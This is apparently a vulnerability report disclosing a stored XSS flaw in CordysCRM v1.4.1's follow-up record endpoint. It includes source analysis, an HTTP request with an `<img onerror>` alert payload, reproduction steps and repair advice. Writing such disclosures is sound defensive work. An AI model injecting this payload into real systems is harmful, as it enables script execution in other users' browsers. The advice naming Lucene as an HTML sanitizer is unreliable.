## Vulnerability Description

A **stored cross-site scripting (XSS)** vulnerability exists in the `CustomerFollowRecordController` component of CordysCRM v1.4.1. This vulnerability stems from the `add()` method's failure to adequately validate or encode the `content` parameter when handling requests to save customer follow-up records. A remote attacker could exploit the `/account/follow/record/add` interface to submit malicious JavaScript code. When the user clicks to view customer follow-up records, the malicious script will execute in their browser environment.

## Vulnerability Analysis

The vulnerability's entry point class file is: src/main/java/cn/cordys/crm/customer/controller/CustomerFollowRecordController.java

The `add()` method does not perform any XSS filtering; it proceeds to the logic layer for processing.

<img width="1426" height="677" alt="Pasted image 20260514144839" src="https://github.com/user-attachments/assets/7643cbd0-3580-4135-a2c8-7a844f5aedd0" />


Logic layer class file: src/main/java/cn/cordys/crm/follow/service/FollowUpRecordService.java


The logic layer did not perform any XSS filtering on the `content` parameter of the incoming follow-up content. Line 108 calls a database operation to insert data into the database. A stored XSS vulnerability exists.


<img width="1477" height="920" alt="Pasted image 20260514145054" src="https://github.com/user-attachments/assets/546ebe0f-8618-446c-af60-54e30ad29007" />


## Vulnerability Reproduction


Enter the customer follow-up interface

<img width="1920" height="767" alt="Pasted image 20260514145139" src="https://github.com/user-attachments/assets/6acf888b-0eba-4789-97a9-5bab1fc4c37e" />


In the follow-up content, enter this payload: <img src=x onerror=alert('XSS')>

<img width="1629" height="1028" alt="Pasted image 20260514145247" src="https://github.com/user-attachments/assets/3ec80c7b-dbf2-454f-8368-7bf86eef7083" />


Clicking the save button will trigger the following request packet.

```http
POST /account/follow/record/add HTTP/1.1
Host: localhost:8081
Content-Length: 304
X-AUTH-TOKEN: 5b596f77-5942-4eb7-94a4-6b3fefbc2f29
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN
sec-ch-ua: "Chromium";v="143", "Not A(Brand";v="24"
CSRF-TOKEN: CYkmuI1mOs5o/hOiqbqVQ1GvBQNqI891/DPRjSiSWZO0COyOcRSal7HBV+vWJ/ZqoEzUK8bbPNvsn7sPXi/Q6zUMWQVE7TclCluHty1WIQ==
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Origin: http://localhost:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8081/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"type":"CUSTOMER","customerId":"721348347314176","id":"721348347314176","moduleFields":[{"fieldId":"909021238272047","fieldValue":[]}],"clueId":"","opportunityId":"","contactId":"721657584959488","followMethod":"2","followTime":1778774400000,"owner":"admin","content":"<img src=x onerror=alert('XSS')>"}

```

<img width="1920" height="978" alt="Pasted image 20260514145359" src="https://github.com/user-attachments/assets/4096a89b-f81a-4ac8-a286-50effd21ae1f" />


After saving, on the main interface, click the "View Follow-up Content" function as follows:

<img width="1914" height="921" alt="Pasted image 20260514145506" src="https://github.com/user-attachments/assets/9fb5ecf3-b8ee-4071-9ea1-4d1bb8ab70f1" />


To view the follow-up content you just created, click on details:

<img width="1913" height="873" alt="Pasted image 20260514145654" src="https://github.com/user-attachments/assets/dd4d130b-9fc9-4bb0-b50b-d1f976940655" />


The payload was successfully triggered, indicating the existence of a stored XSS vulnerability. Vulnerability reproduction is complete.

<img width="1918" height="909" alt="Pasted image 20260514145709" src="https://github.com/user-attachments/assets/674f5636-da4f-41ba-a948-8bde13b45baf" />


## Repair suggestions


Input Filtering: Use a security library (such as Java's AntiSamy or Lucene) in the backend to whitelist submitted HTML content, removing dangerous tags and attributes such as `script` and `onmouseover`.

Output Escaping: Ensure variables are HTML entity encoded when rendering announcement content in the frontend template.

Content Security Policy (CSP): Configure an appropriate CSP policy to restrict the execution of inline scripts.
